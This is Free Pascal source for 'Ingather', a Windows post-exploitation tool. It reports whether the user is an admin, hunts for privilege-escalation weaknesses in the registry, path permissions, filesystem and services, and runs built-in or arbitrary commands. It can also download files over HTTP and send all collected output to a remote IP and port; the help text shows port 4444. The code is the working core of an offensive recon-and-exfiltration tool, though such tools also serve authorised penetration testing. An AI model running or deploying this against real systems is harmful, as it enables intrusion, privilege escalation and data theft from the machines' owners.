program Ingather;
{
 AUTHOR:  Brian Kellogg

 MIT licensed
}

{$mode objfpc}{$H+}

uses
  Classes, SysUtils, CustApp, WinUsers, RunAs, NetIO, FindVulns, RunCMD,
  WinFileSystem, StrUtils, JsonTools, DataDefs
  { you can add units after this };

type
  { TIngather }
  TIngather = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
  private
    function PrintHeader(cmd: string): AnsiString;
    function PrintEnums(cmds: TDataDefs.CommandArray): AnsiString;
    procedure DownloadFile();
    function RunEnums(): AnsiString;
    function RunCmd(): AnsiString;
    function RunCmds(): AnsiString;
    procedure Tx(output: AnsiString);
    procedure SaveOutput(output: AnsiString);
  end;

{ TIngather }

procedure TIngather.DoRun;
var
  ErrorMsg        : String = '';
  escalate        : TRunAs;
  output          : AnsiString = '';
  ScreenPrint     : Boolean = true;
begin
  // quick check parameters
  ErrorMsg:= CheckOptions('cdhliposez','command download help list ip out port save enum');
  if (ErrorMsg <> '') or (HasOption('h','help')) or (ParamCount = 0) then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  // Is user an admin
  escalate:= TRunAs.Create;
  if escalate.IsUserAdmin then
    output:= concat(output, '[!] You are an admin' + sLineBreak)
  else
    output:= concat(output, '[*] You are not an admin.' + sLineBreak);
  escalate.Free;

  if HasOption('l','list') then begin
    output:= concat(output, PrintHeader('Enumeration Commands'));
    output:= concat(output, PrintEnums(TDataDefs.CMDS));
  end;

  // download file
  if HasOption('d','download') and HasOption('s','save') then begin
    DownloadFile;
  end;

  // do vulnerability enumeration on host
  if HasOption('c', 'command') then begin
    output:= concat(output, RunCmd());
  end;

  if HasOption('e','enum') then begin
    // run system enumeration analysis
    output:= concat(output, RunEnums());
    // run basic enumeration commands
    output:= concat(output, RunCmds());
  end;

  // Send output to another computer?
  if HasOption('i','ip') and HasOption('p','port') then begin
    Tx(output);
    ScreenPrint:= false;
  end;

  // Write all command outputs to a file?
  if HasOption('o','out') then begin
    SaveOutput(output);
    ScreenPrint:= false;
  end;

  if ScreenPrint then writeln(output);

  Terminate;
end;

procedure TIngather.DownloadFile();
var
  ErrorMsg: String = '';
  nwrk    : TNetIO;
  download: string = '';
  save    : string = '';
begin
  nwrk:= TNetIO.Create;
  download:= Self.GetOptionValue('d','download');
  save:= Self.GetOptionValue('s','save');
  if HasOption('z') then
    nwrk.WinHTTPGet(download, save)
  else begin
    ErrorMsg:= nwrk.DownloadHTTP(download, save);
    writeln(ErrorMsg);
  end;
  nwrk.Free;
end;

function TIngather.RunEnums(): AnsiString;
var
  vulns : TFindVulns;
begin
  result:= '';
  vulns:= TFindVulns.Create;
  writeln('[*] Inspecting the registry');
  result:= concat(result, vulns.GetRegVulns + sLineBreak);
  writeln('[*] Inspecting environment paths');
  result:= concat(result, vulns.CheckEnvPathPerms + sLineBreak);
  writeln('[*] Inspecting filesystem');
  result:= concat(result, vulns.GetFSVulns + sLineBreak);
  writeln('[*] Inspecting service configurations');
  result:= concat(result, vulns.GetVulnServices + sLineBreak);
  vulns.Free;
end;

function TIngather.RunCmd(): AnsiString;
var
  execute: TRunCMD;
  command: String = '';
begin
  execute:= TRunCMD.Create;
  writeln('[*] Running custom commands');
  command:= Self.GetOptionValue('c','command');
  result:= execute.getOutput(command, '', false);
  execute.Free;
end;

function TIngather.RunCmds(): AnsiString;
var
  x      : Integer;
  execute: TRunCMD;
begin
  writeln('[*] Running misc. enumeration commands');
  result:= '';
  execute:= TRunCMD.Create;
  for x:= 1 to TDataDefs.NUM_CMDS do begin
    result:= concat(result, PrintHeader(TDataDefs.CMDS[x][1]));
    result:= concat(result, execute.getOutput(TDataDefs.CMDS[x][1], '', false));
    result:= concat(result, sLineBreak)
  end;
  execute.Free;
end;

procedure TIngather.Tx(output: AnsiString);
var
  ip  : AnsiString = '';
  port: AnsiString = '';
  nwrk: TNetIO;
begin
  nwrk:= TNetIO.Create;
  ip:= Self.GetOptionValue('i','ip');
  port:= Self.GetOptionValue('p','port');
  writeln('[*] sending all output to ' + ip + ':' + port);
  nwrk.SendIt(ip, port, output);
  nwrk.Free;
end;

procedure TIngather.SaveOutput(output: AnsiString);
var
  tfOut  : TextFile;
  outfile: AnsiString = '';
begin
  outfile:= Self.GetOptionValue('o','out');
  AssignFile(tfOut, outfile);
  rewrite(tfOut);
  writeln(tfOut, output);
  writeln('[*] Wrote output to file');
end;

function TIngather.PrintHeader(cmd: string): AnsiString;
begin
  result:= '';
  result:= concat(result, '[*] '+cmd+sLineBreak);
end;

function TIngather.PrintEnums(cmds: TDataDefs.CommandArray): AnsiString;
var
  x: integer;
begin
  result:= '';
  for x:= 1 to TDataDefs.NUM_CMDS do begin
    result:= concat(result, '[**] Command: '+cmds[x][1]+sLineBreak);
    result:= concat(result, ' Description: '+cmds[x][2]+sLineBreak);
  end;
end;

procedure TIngather.WriteHelp;
begin
  writeln;
  writeln('Usage: Ingather.exe -i 1.1.1.1 -p 4444 -o output.txt');
  writeln('       Ingather.exe -d http://www.abcded.com/abc.txt -s c:\temp\abc.text');
  writeln('       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444');
  writeln;
  writeln('Download file over HTTP:');
  writeln('       -d, --download    : download file');
  writeln('       -s, --save        : location to save downloaded file to');
  writeln('       -z,               : use the Windows HTTP download function');
  writeln('                           otherwise use custom HTTP download function');
  writeln('Run options:');
  writeln('       -c, --command     : run custom command');
  writeln('       -e, --enum        : run all builtin enumerations');
  writeln('Output options:');
  writeln('       -i, --ip          : destination IP address');
  writeln('       -p, --port        : destination port');
  writeln('       -o, --out         : write enumeration command outputs to file');
  writeln('NOTE: If output to file or network is specified,');
  writeln('      screen output will be suppressed.');
  writeln('Info:');
  writeln('       -h, --help        : print this help message');
  writeln('       -l, --list        : print default enum commands and descriptions');
  writeln;
end;

constructor TIngather.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:= True;
end;

destructor TIngather.Destroy;
begin
  inherited Destroy;
end;

var
  Application: TIngather;
begin
  Application:= TIngather.Create(nil);
  Application.Title:= 'Ingather';
  Application.Run;
  Application.Free;
end.
